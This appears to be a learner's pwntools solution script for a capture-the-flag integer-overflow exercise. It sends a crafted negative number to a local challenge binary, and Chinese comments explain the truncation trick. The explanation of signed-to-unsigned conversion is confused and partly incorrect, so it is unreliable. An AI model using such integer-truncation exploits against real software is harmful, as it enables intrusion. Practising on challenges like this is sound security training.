from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/integer-overflow-level3.0"
p = process(challenge_path)

# create string
shellcode="-000000178806ad9"
p.send(shellcode)
# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
注意是回车符会占位，所以不要发送回车
输入一个64位int i，转化为32位j，16位k满足条件
(i < 0) || ((uint64_t)i) >= 0xFFFFFFFE00000000)
(j < 0) || ((uint32_t)j) <= 0x88880000)
(k < 0) || ((uint16_t)k) == 0x9527)
输入的时候要带负号-，数字在计算机中是按补码存储
这样符号标志sf会被设为1，但其他位正常拷贝当作补码存储
在转变为无符号数的时候，先取反加一获得源码，再翻译源码，64位int的最高位本来是符号位转化为数值位，变大
而64位int转化为32位和16位的时候，直接拷贝低位部分，但是会设置sf继承64位的符号？？？？
也就是说，如果sf为0，转化为无符号数的时候会直接将补码当作原码读取（最高位变为数值位）
如果sf为1，负数，转化为无符号数的时候，先取反加一获得源码，再翻译源码！！！！！！！！！！！！！！
所以转为补码作输入
'''